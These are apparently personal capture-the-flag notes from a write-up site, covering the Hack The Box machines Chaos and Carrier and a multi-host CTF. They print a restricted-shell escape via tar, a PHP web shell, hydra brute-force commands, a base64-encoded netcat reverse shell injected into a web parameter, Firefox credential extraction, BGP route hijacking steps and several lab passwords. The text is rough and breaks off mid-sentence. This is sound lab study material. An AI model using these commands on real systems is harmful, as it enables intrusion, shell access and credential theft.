SELFAUTODIR=\u0026quot;/usr\u0026quot; declare -x SELFAUTOGRANDPARENT=\u0026quot;/\u0026quot; declare -x SELFAUTOLOC=\u0026quot;/usr/bin\u0026quot; declare -x SELFAUTOPARENT=\u0026quot;/\u0026quot; declare -rx SHELL=\u0026quot;/opt/rbash\u0026quot; declare -x SHLVL=\u0026quot;2\u0026quot; declare -x USER=\u0026quot;ayush\u0026quot; declare -x XDG_RUNTIME_DIR=\u0026quot;/run/user/1001\u0026quot; declare -x XDG_SESSION_ID=\u0026quot;c4\u0026quot; declare -x engine=\u0026quot;pdftex\u0026quot; declare -x progname=\u0026quot;pdflatex\u0026quot;  export SHELL=\u0026quot;/bin/bash\u0026quot; export SHELL=\u0026quot;/bin/bash\u0026quot; rbash: SHELL: readonly variable export USER=\u0026quot;WWW-DATA\u0026quot; =fail echo $PATH returns /home/ayush/.app echo os.system(\u0026quot;/bin/bash\u0026quot;) echo os.system\u0026quot;/bin/bash\u0026quot; python -c \u0026quot;import os; os.system('cp');\u0026quot; cannot redirect output cd is restricted can't use / tar xf /dev/null -I '/bin/sh -c \u0026quot;sh \u0026lt;\u0026amp;2 1\u0026gt;\u0026amp;2\u0026quot;' access to tar tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh /bin/ls /bin/cat  ESCAPE FROM AYUSH JAIL\nEscaping from this jail was pretty tough because none of the basic techiquies worked for me. Able to use the tar wild card method to generate a shell. i believe this is a easter egg to tartarsauce.\ntar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh  BEYOND THE ESCAPE\nupgrading tty to something easier to use,\n/usr/bin/python -c 'import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;)'  next step transfer off mail\n/usr/bin/python -m SimpleHTTPServer 9030 /usr/bin/wget http://10.10.14.14:9030/LinEnum.sh  inside mail directory i felt /bin/ls -la /bin/ls -la total 20 drwx------ 3 ayush ayush 4096 Oct 28 12:17 . drwx------ 6 ayush ayush 4096 Feb 11 03:37 .. -rw------- 1 ayush ayush 2638 Oct 28 12:16 Drafts drwx------ 5 ayush ayush 4096 Oct 28 12:13 .imap -rw------- 1 ayush ayush 0 Oct 28 12:10 Sent -rw------- 1 ayush ayush 17 Oct 28 12:13 .subscriptions  /bin/ls -la total 32 drwx------ 5 ayush ayush 4096 Oct 28 12:13 . drwx------ 3 ayush ayush 4096 Oct 28 12:17 .. -rw------- 1 ayush ayush 4028 Oct 28 12:16 dovecot.list.index.log -rw------- 1 ayush ayush 48 Oct 28 12:13 dovecot.mailbox.log -rw------- 1 ayush ayush 8 Oct 28 12:13 dovecot-uidvalidity -r--r--r-- 1 ayush ayush 0 Oct 28 12:10 dovecot-uidvalidity.5bd5a723 drwx------ 2 ayush ayush 4096 Oct 28 12:13 Drafts drwx------ 2 ayush ayush 4096 Oct 28 12:10 INBOX drwx------ 2 ayush ayush 4096 Oct 28 12:10 Sent  Find Suin perms\n/usr/bin/find / -user root -perm -4000 -print 2\u0026gt;/dev/null / -user root -perm -4000 -print 2\u0026gt;/dev/null /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/eject/dmcrypt-get-device /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/bin/chfn /usr/bin/traceroute6.iputils /usr/bin/chsh /usr/bin/passwd /usr/bin/newgrp /usr/bin/pkexec /usr/bin/sudo /usr/bin/gpasswd /bin/ntfs-3g /bin/su /bin/umount /bin/fusermount /bin/ping /bin/mount  /usr/bin/sudo -l [sudo] password for ayush: jiujitsu Sorry, user ayush may not run sudo on chaos.  not sure why i didn\u0026rsquo;t check the default directory fully first.\n/bin/ls -la total 40 drwx------ 6 ayush ayush 4096 Feb 11 21:46 . drwxr-xr-x 4 root root 4096 Oct 28 11:34 .. drwxr-xr-x 2 root root 4096 Oct 28 12:25 .app -rw------- 1 root root 0 Nov 24 23:57 .bash_history -rw-r--r-- 1 ayush ayush 220 Oct 28 11:34 .bash_logout -rwxr-xr-x 1 root root 22 Oct 28 12:27 .bashrc drwx------ 3 ayush ayush 4096 Feb 11 03:37 .gnupg drwx------ 3 ayush ayush 4096 Oct 28 12:17 mail drwx------ 4 ayush ayush 4096 Sep 29 12:09 .mozilla -rw-r--r-- 1 ayush ayush 807 Oct 28 11:34 .profile -rw------- 1 ayush ayush 33 Oct 28 12:54 user.txt  .APP\nlrwxrwxrwx 1 root root 8 Oct 28 12:25 dir -\u0026gt; /bin/dir /bin/dir -a . .. ayush sahay lrwxrwxrwx 1 root root 9 Oct 28 12:25 ping -\u0026gt; /bin/ping lrwxrwxrwx 1 root root 8 Oct 28 12:25 tar -\u0026gt; /bin/tar  FIREFOX\ndrwx------ 2 ayush ayush 4096 Sep 29 12:09 extensions drwx------ 4 ayush ayush 4096 Sep 29 12:09 firefox  drwx------ 10 ayush ayush 4096 Feb 12 02:25 bzo7sjt1.default drwx------ 4 ayush ayush 4096 Oct 15 03:59 'Crash Reports' -rw-r--r-- 1 ayush ayush 104 Sep 29 12:09 profiles.ini -rw-rw-r-- 1 ayush ayush 716752 Feb 12 03:16 user.zip  Root\nI used zip to compress the mozilla profile and used a github decryptor to get the login creds. transfering bzo7sjt1.default to my system was tricky and compressing it.by default i went to tar but i was getting some kind of error where tar was truncating itsself. there are ways to force / bypass. Zip came to the rescue.\nhttps://github.com/unode/firefox_decrypt\n/usr/bin/zip user.zip bzo7sjt1.default/* /usr/bin/python -m SimpleHTTPServer 9017  python firefox_decrypt/firefox_decrypt.py bzo7sjt1.default/ 2019-02-11 22:28:36,944 - WARNING - profile.ini not found in bzo7sjt1.default/ 2019-02-11 22:28:36,944 - WARNING - Continuing and assuming 'bzo7sjt1.default/' is a profile location Master Password for profile bzo7sjt1.default/: Website: https://chaos.htb:10000 Username: 'root' Password: 'Thiv8wrej~'  So log back in and su root and enter the password.\n"
},
{
	"uri": "/hackthebox/boxes/inusectf/",
	"title": "CTF",
	"tags": [],
	"description": "",
	"content": "The biggest take away would be\nI recently participated in a ctf, it was different than htb. more about finding a bunch of hidden flags all over the file system. in various places. There were 9 host and over 25 flags. This was a fun new kind of a ctf. =].DONT OVERESTIMATE THE CTF.\nWebServer: It had a lot of ports open an I was quick to rush in and wasted a bit of time that couldn\u0026rsquo;t have been prevented. Anyways I thought it was mistakenly a windows host. I should have run a targeted scan next. Just ran a normal Nmap scan instead of using the -sT switch which will perform a TCP connection to the port and it has to respond. It\u0026rsquo;s quicker. Once on the system i used sshuttle to pivot and gaina access to 172.16.42.0/24 subnet.\nRouter: speculation on how to exploit. It was a old d-link router that had several vulnerabilities I couldn\u0026rsquo;t get to work. It had a buffer overflow vulnerability that the pubic poc didn\u0026rsquo;t work but im willing to bet that with modification it might have worked. Because the version was deprecated I feel like this one required custom exploitation.\nFireWall: From what I could tell this was a updated or recently updated version of pfsense. as I uses this at home. So I tried default credentials to login but couldn\u0026rsquo;t gain access. I also ran hydra against the target.\nFileServer: Had some crap on it. I would like to note the ftp server had some filters up and could only be accessed via browser.\nWebServer Dog: This seemed to be some kind of social media mortgage lender. This one I thought was interesting mostly because I thought there might be some saved credentials that might help out with eh domain controller.\nDomain Controller : I wasn\u0026rsquo;t exactly sure how the firewall and the router played into perhaps gaining access to the dc. Or perhaps I didn\u0026rsquo;t find the credentials need to gain access to the dc. I ran various tools to try and get it to dump creds \u0026amp; to enumerate it further. Guest access wasn\u0026rsquo;t enabled. I also ran hydra against this and tried to brute force dc creds. I also tried some kerb attacks that didn\u0026rsquo;t lead anywhere. The system clock could have been off that would be a simple easy trick to fool people someone into thinking guest isn\u0026rsquo;t enabled. On the same note the whole environment system clock could be off.\nThe dotted lines represent a hypothetical connection between the firewall and dc. note that the router is 172.16.1.3\nNmap : Mistakes made because I didn\u0026rsquo;t use -Pn i missed host 172.16.1.2 \u0026amp; worst of all i didn\u0026rsquo;t take the time to further scan the host. I couldn\u0026rsquo;t login in or do anything with it anyways. I should have defeniently done it differently.\n172.16.1.1 Host is up (0.051s latency). Not shown: 997 filtered ports PORT STATE SERVICE 53/tcp open domain 80/tcp open http 443/tcp open https 172.16.1.2 Nmap scan report for Host is up (0.067s latency). Not shown: 984 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 443/tcp open https 445/tcp open microsoft-ds 8080/tcp open http-proxy 8888/tcp filtered sun-answerbook  The Web server itself was simple. With the ability to upload files with a erroneous warning that the upload didn\u0026rsquo;t work. Once the web directory was enumerated you found were the files were uploaded. Could see everything was uploaded, all the code did was produce an error. From watching ippsec video\u0026rsquo;s I have a little script I like to use to gain a simple foothold. The Webserver it self was simple. With the ability to upload files with a erroneous warning that the upload didn\u0026rsquo;t work. Once the web directory was enumerated you found were the files were uploaded. Could see everything was uploaded, all the code did was produce an error. From watching ippsec video\u0026rsquo;s i have a little script i like to use to gain a simple foothold.\nI could not run gain a shell from www-data. I was able to gain directory traversal that lead to lfi . note when using this it is CAPS.\n\u0026lt;?php system($_REQUEST['CMD']) ?\u0026gt;  At least i got a user which is half the battle. I found out using hydra the password was david.\nhydra -l david -P /home/htb/wordlist/rockyou.txt 172.16.1.2 ssh  I used ssh gain access to the system found some flags. ifconfig revealed there was another subnet. So from doing hacktheboxes, I knew I could use a for loop and nc to enumerate the other subnet without having to move over a nmap binary. Because of the names in the host list in the menu I knew one was a DC so I also used port 88 instead of 22.\nfor i in {1..254}; do nc -v -n -z -w 1 172.16.42.$i 22; done | grep -v 'timed'  172.16.42.15 port:88,139,445 172.16.42.25 port:22,80,443 172.16.42.139 port:21,22  I also moved over a nmap binary to further scan the network. It is deprecated without the supporting files, anywho.\nSYSTEM 25 4\u0026frasl;5 web server or rhel-2394-11922\nuser = root , pass = pinkiepie 3 # MAY ALSO USE RSA KEY FOUND /var/www/back_ups\nwebpage creds admin/admin. I had hoped since this logs into a personal account there might be saved creds in the Mozilla folder. The server is using\n1) Found /home/pinkiepie/ftp_check.sh which contained credentials to host 139\n#!/bin/sh HOST='139' USER='pinkiepie' PASSWD='hacker$bad'  2) Found a FLAG in BASH HISTORY\n192 cd /var/www/html/\n193 ssh-keygen -t rsa -C \u0026ldquo;sara@global.scb\u0026rdquo;\n192 cd /var/www/html/ 193 ssh-keygen -t rsa -C \u0026quot;sara@global.scb\u0026quot;  3) Hard Coded Credentials FLAG The login Credentials for the webpage are admin, admin. so lucky xD\nSYSTEM** 4\u0026frasl;4 139 NAME = file server / chicken\nuser = pinkiepie, pass = chickenpwny\nuser = pie, pass = meowmeow!@#\nThe most interesting thing about host 139 was accessing the FTP server via the browser. finding the flags wasn\u0026rsquo;t too hard. Be sure to run sudo -l every time you find a new user. be sure to check the home directory for more users. User past flags or things found previously in the ctf to guess the user password.\n"
},
{
	"uri": "/hackthebox/boxes/carrier/",
	"title": "Carrier",
	"tags": [],
	"description": "",
	"content": " TCP Nmap 7.70 scan initiated Sat Dec 22 18:11:46 2018 as: nmap -sC -sV -oA carrier-total -T5 -p- 10.10.10.105 Nmap scan report for carrier.htb (10.10.10.105) Host is up (0.14s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 21/tcp filtered ftp 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 15:a4:28:77:ee:13:07:06:34:09:86:fd:6f:cc:4c:e2 (RSA) | 256 37:be:de:07:0f:10:bb:2b:b5:85:f7:9d:92:5e:83:25 (ECDSA) |_ 256 89:5a:ee:1c:22:02:d2:13:40:f2:45:2e:70:45:b0:c4 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Login Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  UDP Nmap 7.70 scan initiated Fri Dec 14 02:02:47 2018 as: nmap -sV -sU -oA udtp-scan -T4 10.10.10.105 Warning: 10.10.10.105 giving up on port because retransmission cap hit (6). Nmap scan report for carrier.htb (10.10.10.105) Host is up (0.13s latency). Not shown: 988 closed ports PORT STATE SERVICE VERSION 67/udp open|filtered dhcps 138/udp open|filtered netbios-dgm 161/udp open snmp SNMPv1 server; pysnmp SNMPv3 server (public) 1041/udp open|filtered danf-ak2 3389/udp open|filtered ms-wbt-server 17302/udp open|filtered unknown 18980/udp open|filtered unknown 19489/udp open|filtered unknown 30544/udp open|filtered unknown 36945/udp open|filtered unknown 49188/udp open|filtered unknown 64513/udp open|filtered unknown  SNMPWalk\nsnmpwalk -v -2c -c public carrier.htb  GOBUSTER /img (Status: 301) /index.php (Status: 200) /tools (Status: 301) /doc (Status: 301) /css (Status: 301) /js (Status: 301) /tickets.php (Status: 302) /fonts (Status: 301) /dashboard.php (Status: 302) /debug (Status: 301) /diag.php (Status: 302) /server-status (Status: 403)  USERNAME = admin\nPASSWORD = NET_45JDX23\n   45007 16 operation failed. Foreign key relationships between federate tables must include the federation key column(s)     45009 16 operation failed. The operation is not supported on filtering connections    ![mg](C:\\Users\\charl\\OneDri\nvTickets 1 Closed Welcome to Lyghtspeed's lightweight telco support system! 2 Closed Rx / Mr. White. Says he can't get to \u0026quot;the interwebz\u0026quot;. Cleared cache/cookie, etc., rebooted PC. Pb fixed. 3 Open Rx / Jeremy Paxton. Customer complaining about \u0026quot;choke\u0026quot; and \u0026quot;lags\u0026quot; with BoogleGrounds gaming application. Ticket opened with field services to check DSL line. Update 2018/05/30: DSL line checks out OK, sending to IP Core team for further investigation. 4 Escalated Rx / Cust #642. Need help setting up Outlook Express on Windows 98. Told customer this platform is no longer supported. Customer has requested an escalation to my manager. 5 Closed Rx / LoneWolf7653. User called in to report what is according to him a \u0026quot;critical security issue\u0026quot; in our demarc equipment. Mentioned something about a CVE (??). Request contact info and sent to legal for further action. 6 Closed Rx / CastCom. IP Engineering team from one of our upstream ISP called to report a problem with some of their routes being leaked again due to a misconfiguration on our end. Update 2018/06/13: Pb solved: Junior Net Engineer Mike D. was terminated yesterday. Updated: 2018/06/15: CastCom. still reporting issues with 3 networks: 10.120.15,10.120.16,10.120.17/24's, one of their VIP is having issues connecting by FTP to an important server in the 10.120.15.0/24 network, investigating... Updated 2018/06/16: No prbl. found, suspect they had stuck routes after the leak and cleared them manually. 7 Closed Rx / Pam Dubois. Customer is inquiring about multiple emails received from a \u0026quot;Nigerian Prince\u0026quot;. Upselled customer our email security mgmt solution. 8 Open Rx / Roger (from CastCom): wants to schedule a test of their route filtering policy, asked us to inject one of their routes from our side. He's insisted we tag the route correctly so it is not readvertised to other BGP AS'es.  root.TXT This is where the madness begins. I\u0026rsquo;m keeping this craziness for my notes so it wont make much since. Please read CarrierRoot.\nAfter fuzzing the website for awhile the only thing that seems exploitable was check function/action. After awhile of trial and error I figured out that it needs the initial part then using \u0026amp;\u0026amp; after it will execute the commands\ntcpdump -i tun0 icmp  echo 'quagga\u0026amp;\u0026amp;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc CHANGE-ME 9056 \u0026gt;/tmp/f' \u0026gt; shell.b64 base64 -w0 shell.b64 output: base64 -d or decode in burp cXVhZ2dhJiZybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyBDSEFOR0UtTUUgOTA1NiA+L3RtcC9mCg  Active Internet connections (servers and established)\nProto Recv-Q Send-Q Local Address Foreign Address State PID/Program name\ntcp 0 0 127.0.0.1:2601 0.0.0.0:* LISTEN 22420/zebra tcp 0 0 127.0.0.1:2605 0.0.0.0:* LISTEN 22424/bgpd tcp 0 0 0.0.0.0:179 0.0.0.0:* LISTEN 22424/bgpd tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 479/sshd tcp 0 0 10.78.11.1:179 10.78.11.2:45846 ESTABLISHED 22424/bgpd tcp 0 3918 10.99.64.2:45600 10.10.14.14:9056 ESTABLISHED 22300/nc tcp 0 0 10.78.10.1:179 10.78.10.2:33524 ESTABLISHED 22424/bgpd tcp 0 0 10.99.64.2:22 10.99.64.251:58436 ESTABLISHED 22263/sshd: root@no tcp 0 0 10.99.64.2:22 10.99.64.251:55234 ESTABLISHED 16732/sshd: root@no tcp6 0 0 :::179 :::* LISTEN 22424/bgpd tcp6 0 0 :::22 :::* LISTEN 479/sshd  Neat\nThere are some distinct differences between the openbsd netcat and ubuntu\n nc -w 3 10.10.14.14 9058 \u0026lt; zebra.conf nc -lp \u0026gt; zebra.conf show version Quagga 0.99.24.1 (Router). Copyright 1996-2005 Kunihiro Ishiguro, et al. configured with: show logging Syslog logging: disabled Stdout logging: disabled Monitor logging: level debugging File logging: disabled Protocol name: ZEBRA Record priority: disabled Timestamp precision: 0 ###### cat /etc/quagga/bgpd.conf ! ! Zebra configuration saved from vty ! 2018/07/02 02:14:27 ! route-map to-as200 permit 10 route-map to-as300 permit 10 ! router bgp 100 bgp router-id 10.255.255.1 network 10.101.8.0/21 network 10.101.16.0/21 redistribute connected neighbor 10.78.10.2 remote-as 200 neighbor 10.78.11.2 remote-as 300 neighbor 10.78.10.2 route-map to-as200 out neighbor 10.78.11.2 route-map to-as300 out ! line vty !  sudo ip route sudo: unable to resolve host r1: Connection refused default via 10.99.64.1 dev eth0 onlink 10.78.10.0/24 dev eth1 proto kernel scope link src 10.78.10.1 10.78.11.0/24 dev eth2 proto kernel scope link src 10.78.11.1 10.99.64.0/24 dev eth0 proto kernel scope link src 10.99.64.2  zebra.conf zebra.conf.orig zebra.conf.sav  cp zebra.conf.orig zebra.conf telnet localhost 2601 -l zebra  netstat -rn Kernel IP routing table Destination Gateway Genmask Flags MSS Window irtt Iface 0.0.0.0 10.99.64.1 0.0.0.0 UG 0 0 0 eth0  sudo vtysh -c \u0026ldquo;show ip route\u0026rdquo; sudo: unable to resolve host r1: Connection refused Codes: K - kernel route, C - connected, S - static, R - RIP, ​ O - OSPF, I - IS-IS, B - BGP, P - PIM, A - Babel, ​ \u0026gt; - selected route, * - FIB route K\u0026gt;* 0.0.0.0/0 via 10.99.64.1, eth0 C\u0026gt;* 10.78.10.0/24 is directly connected, eth1 C\u0026gt;* 10.78.11.0/24 is directly connected, eth2 C\u0026gt;* 10.99.64.0/24 is directly connected, eth0 C\u0026gt;* 127.0.0.0/8 is directly connected, lo  sudo vtysh -c \u0026ldquo;show ip bgp\u0026rdquo; sudo: unable to resolve host r1: Connection refused BGP table version is 0, local router ID is 10.255.255.1 Status codes: s suppressed, d damped, h history, * valid, \u0026gt; best, = multipath, ​ i internal, r RIB-failure, S Stale, R Removed Origin codes: i - IGP, e - EGP, ? - incomplete Network Next Hop Metric LocPrf Weight Path *\u0026gt; 10.78.10.0/24 0.0.0.0 0 32768 ? *\u0026gt; 10.78.11.0/24 0.0.0.0 0 32768 ? *\u0026gt; 10.99.64.0/24 0.0.0.0 0 32768 ? *\u0026gt; 10.101.8.0/21 0.0.0.0 0 32768 i *\u0026gt; 10.101.16.0/21 0.0.0.0 0 32768 i  to view route tables inside quagga\nhttps://www.nongnu.org/quagga/docs/docs-multi/Static-Route-Commands.html\nshow ip route Codes: K - kernel route, C - connected, S - static, R - RIP, ​ O - OSPF, I - IS-IS, B - BGP, P - PIM, A - Babel, ​ \u0026gt; - selected route, * - FIB route K\u0026gt;* 0.0.0.0/0 via 10.99.64.1, eth0 C\u0026gt;* 10.78.10.0/24 is directly connected, eth1 C\u0026gt;* 10.78.11.0/24 is directly connected, eth2 C\u0026gt;* 10.99.64.0/24 is directly connected, eth0 B\u0026gt;* 10.100.10.0/24 [20/0] via 10.78.10.2, eth1, 00:06:18 B\u0026gt;* 10.100.11.0/24 [20/0] via 10.78.10.2, eth1, 00:06:18 B\u0026gt;* 10.100.12.0/24 [20/0] via 10.78.10.2, eth1, 00:06:18 B\u0026gt;* 10.100.13.0/24 [20/0] via 10.78.10.2, eth1, 00:06:18 B\u0026gt;* 10.100.14.0/24 [20/0] via 10.78.10.2, eth1, 00:06:18 B\u0026gt;* 10.100.15.0/24 [20/0] via 10.78.10.2, eth1, 00:06:18 B\u0026gt;* 10.100.16.0/24 [20/0] via 10.78.10.2, eth1, 00:06:18 B\u0026gt;* 10.100.17.0/24 [20/0] via 10.78.10.2, eth1, 00:06:18 B\u0026gt;* 10.100.18.0/24 [20/0] via 10.78.10.2, eth1, 00:06:18 B\u0026gt;* 10.100.19.0/24 [20/0] via 10.78.10.2, eth1, 00:06:18 B\u0026gt;* 10.100.20.0/24 [20/0] via 10.78.10.2, eth1, 00:06:18 B\u0026gt;* 10.120.10.0/24 [20/0] via 10.78.11.2, eth2, 00:06:16 B\u0026gt;* 10.120.11.0/24 [20/0] via 10.78.11.2, eth2, 00:06:16 B\u0026gt;* 10.120.12.0/24 [20/0] via 10.78.11.2, eth2, 00:06:16 B\u0026gt;* 10.120.13.0/24 [20/0] via 10.78.11.2, eth2, 00:06:16 B\u0026gt;* 10.120.14.0/24 [20/0] via 10.78.11.2, eth2, 00:06:16 B\u0026gt;* 10.120.15.0/24 [20/0] via 10.78.11.2, eth2, 00:06:16 B\u0026gt;* 10.120.16.0/24 [20/0] via 10.78.11.2, eth2, 00:06:16 B\u0026gt;* 10.120.17.0/24 [20/0] via 10.78.11.2, eth2, 00:06:16 B\u0026gt;* 10.120.18.0/24 [20/0] via 10.78.11.2, eth2, 00:06:16 B\u0026gt;* 10.120.19.0/24 [20/0] via 10.78.11.2, eth2, 00:06:16 B\u0026gt;* 10.120.20.0/24 [20/0] via 10.78.11.2, eth2, 00:06:16 C\u0026gt;* 127.0.0.0/8 is directly connected, lo  Router# show ip route 10.120.15.0/24  ``` show ip route 10.120.15.0/24 Routing entry for 10.120.15.0/24 Known via \u0026ldquo;bgp\u0026rdquo;, distance 20, metric 0, best Last update 00:08:16 ago\n 10.78.11.2, via eth2  ```  Router# show running-config show running-config Current configuration: ! hostname Router password zebra enable password zebra ! router bgp 100 bgp router-id 10.255.255.1 network 10.101.8.0/21 network 10.101.16.0/21 redistribute connected neighbor 10.78.10.2 remote-as 200 neighbor 10.78.10.2 route-map to-as200 out neighbor 10.78.11.2 remote-as 300 neighbor 10.78.11.2 route-map to-as300 out ! route-map to-as200 permit 10 ! route-map to-as300 ermit 10 ! line vty   arp Address HWtype HWaddress Flags Mask Iface 10.99.64.251 ether 00:16:3e:f3:92:14 C eth0 10.78.10.2 ether 00:16:3e:5b:49:a9 C eth1 10.78.11.2 ether 00:16:3e:c4:fa:83 C eth2 10.99.64.1 ether fe:30:d6:a4:df:a0 C eth0 sweet the addresses needed or are theses the address I set. i believe i only need to change the route metric of one of the addresses. BGP COMMANDS  summary of tickets 3# Day 5 customers experience lag\n5# Day unknown a customer calls to report some kind of CVE maybe bgp hijacking. CVE\n6# Day 38 Castcom calls to report routes being leaked due to \u0026ldquo;misconfiguration\u0026rdquo;. Mike D.was terminated\n7# Day 40 Castcom still reporting issues with 10.120.15.0/24 10.120.16.0/24 10.120.17.0/24\n8# Day 41 Somebody cleared the routes after the leak, fixed by clearing config files.\narp request can\u0026rsquo;t find local address same subnet, changing\nRx / CastCom. IP Engineering team from one of our upstream ISP called to report a problem with some of their routes being leaked again due to a misconfiguration on our end. Update 2018/06/13: Pb solved: Junior Net Engineer Mike D. was terminated yesterday. Updated: 2018/06/15: CastCom. still reporting issues with 3 networks: 10.120.15,10.120.16,10.120.17\u0026frasl;24\u0026rsquo;s, one of their VIP is having issues connecting by FTP to an important server in the 10.120.15.0/24 network, investigating\u0026hellip; Updated 2018/06/16: No prbl. found, suspect they had stuck routes after the leak and cleared them manually.\nTHE ABOVE IS FROM THE WEBPAGE TICKETS found the network i need to connect to.\nsetting up bgp and zebra\necho \u0026quot; ! hostname Router password zebra enable password zebra ! \u0026quot; \u0026gt;\u0026gt; zebra.conf.orig  copy zebra.conf.orgin into zebra.conf restart quagga\ncp zebra.conf.orig zebra.conf  restart quagga for the changes to take effect.\n/etc/init.d/quagga restart  then telnet into zebra the router. i mistakenly used zebra for the bgp changes. yikes. -l username\n[ZEBRA] Unknown command: router bgp autonomous-system\n %\ntelnet localhost zebra  echo \u0026quot; ! hostname Router password zebra enable password zebra ! \u0026quot; \u0026gt;\u0026gt; bgpd.conf.orig  Restart is not requeired %\ncp bgpd.conf.orig bgpd.conf  Then telnet into bgp deamon -l username\ntelnet localhost bgpd -l zebra  Escape character is \u0026lsquo;^]\u0026rsquo;.\nHello, this is Quagga (version 0.99.24.1). Copyright 1996-2005 Kunihiro Ishiguro, et al.\n first step defining the autonomous systems.\nen - enable // enter PASS: zebra config terminal route-map MYMAP permit 10 changes the hop count  sh ip bgp finding neighbors router#\nsh ip bgp  interesting in the above after messing with it for awhile\n10.120.15.0/24 10.78.10.2 0 200 300 i *\u0026gt; 10.78.11.2 0 0 300 i  sh ip bgp 10.120.15.0 sh ip bgp 10.120.15.0 BGP routing table entry for 10.120.15.0/24 Paths: (2 available, best #2, table Default-IP-Routing-Table) Advertised to non peer-group peers: 10.78.10.2 200 300 10.78.10.2 from 10.78.10.2 (10.255.255.2) Origin IGP, localpref 100, valid, external Last update: Wed Jan 9 03:22:08 2019 Local 0.0.0.0 from 0.0.0.0 (10.255.255.1) Origin incomplete, metric 0, localpref 100, weight 32768, valid, sourced, best Last update: Wed Jan 9 03:20:06 2019  BGP neighbor is 10.78.10.2, remote AS 200, local AS 100, external link BGP version 4, remote router ID 10.255.255.2 BGP state = Established, up for 00:04:02  Connections established 1; dropped 0 Last reset never Local host: 10.78.10.1, Local port: 179 Foreign host: 10.78.10.2, Foreign port: 54702 Nexthop: 10.78.10.1 Nexthop global: fe80::216:3eff:fe8a:f24f Nexthop local: :: BGP connection: non shared network Read thread: on Write thread: off BGP neighbor is 10.78.11.2, remote AS 300, local AS 100, external link BGP version 4, remote router ID 0.0.0.0 BGP state = Active Last read 00:04:11, hold time is 180, keepalive interval is 60 seconds Message statistics: Inq depth is 0  sudo iptables -t nat -F sudo iptables -t nat -A PREROUTING -d 10.78.11.2 -m ttl --ttl-gt 1 -j NETMAP --to 10.120.15.1 sudo iptables -t nat -A POSTROUTING -s 10.120.15.1 -j NETMAP --to 10.78.11.2  in zebra\nen\ninterface eth3\ntracepath is for linxu traceroute is for windows duh\ntracepath 10.120.15.10 why does the local ip repeat? \u0026ldquo;symptom of suboptimal route or load-sharing\u0026rdquo; troubleshooting next-hop table particular route-map/PBR/filters applied to the ip. show cdp neighbor.\n 1?: [LOCALHOST] pmtu 1500 1: 10.78.11.2 0.053ms 1: 10.78.11.2 0.021ms 2: 10.120.15.10 0.055ms reached Resume: pmtu 1500 hops 2 back 2 ftp 10.120.15.10 Login failed.  TRYING TO UNDERSTAND BGP NEIGHBORS\nto enable a tcp connection between two routers they need to neighbors enorder to echange route tables.\nen\ncronfig terminal\ninterface eth2\nclear ip bgp address\nNote: The address is the neighbor address.\nclear ip bgp *\nneighbor 10.120.15.10 remote-as 300\nneighbor 10.120.15.1 remote-as 400\nnetwork 10.120.0.0/16\nNOPE RTB# router bgp 100 neighbor 10.120.15.10 remote-as 300  FTP\nftp 10.120.15.10 doesn\u0026rsquo;t work hangs\ntelnet 10.120.15.10 21\nuser anonymous\npass anonymous\nlogin successful\nget root.txt 500 HTTP protocol commands not allowed. Connection closed by foreign host.\n11. Capture FTP Credentials and Commands for i in {1..254}; do nc -v -n -z -w 1 10.120.15.$i 21 |grep failed; done  Capturing FTP commands and login details is straight forward. After the authentication is established an FTP session can be active or passive this will determine whether the data part of the session is conducted over TCP port 20 or another ephemeral port. With the following command you will USER and PASS in the output (which could be fed to grep) as well as the FTP commands such as LIST, CWD and PASSIVE.\n:~$ sudo tcpdump -nn -v port ftp or ftp-data  tl tcpdump -qns 0 -A -r lo.pcap tcpdump -i eth1 -vv -w eth1.pcap tcpdump -i any -vv -w any.pcap tcpdump -qns 0 -A -r eth1.pcap tcpdump -i eth2 -vv -w eth2.pcap tcpdump -qns 0 -A -r eth2.pcap tcpdump -qns 0 -A -r et2.pcap -q -s snaplen -n number trying to change the route-map  tried redistributing the localhost, nothing different happened.\neth1\nRequest who-has 10.78.10.2 tell 10.78.10.1, length 28\n23:06:17.303676 ARP, Request who-has 10.78.10.1 tell 10.78.10.2, length 28\n23:10:12.439816 IP 10.78.11.2.179 \u0026gt; 10.78.11.1.35546: tcp 0\neth2\n23:06:17.303680 ARP, Reply 10.78.10.1 is-at 00:16:3e:8a:f2:4f, length 28\n23:06:17.303694 ARP, Reply 10.78.10.2 is-at 00:16:3e:5b:49:a9, length 28\nJESUS CHRIST\nso after reading the forums everybody says read about bgp leaks which would make since with what we know from the tickets. it\u0026rsquo;s the same site from earlier where i tried to fix 10.120.15.11\u0026frasl;24 network. And tpcdump shows 10.120.15.1 trying to talk around the network but it gets lost can bgp can\u0026rsquo;t establish a connection. i need to fix 10.120.15.1\u0026frasl;24 / 10.78.10.1\u0026frasl;24\nfurther more local address on eth1 can\u0026rsquo;t talk to eth2 which is silly. they also tlak about loop back leaks but none of the stuff gives me anything i can use.\nbgp hijacking not really hakcing your using existing features to make your rogue server the bees knees of routers so all the connection go through it. So to fix the problem or hijack it im not sure what my role is, guess im a hacker so getting ftp creds somehow or use anonymous.\nbgp does not use authentication to verify routes. Any BGP router can steal any prefix or modify routes associated with the prefix.\nsubprefix the attack annouces a subprefix 10.120.15.1\u0026frasl;24 compared to 10.120.0.1\u0026frasl;16\nbgpp prefix hijacking is where you take control of a prefix or 10.1\u0026frasl;8\nfail 4 neighbor 10.120.15.10 remote-as 100 neighbor 10.120.15.10 update-source eth0 neighbor 10.120.15.10 update-source eth1 neighbor 10.120.15.10 update-source loopback  OVERVIEW OF BGP Boarder Gateway Protocol uses TCP, 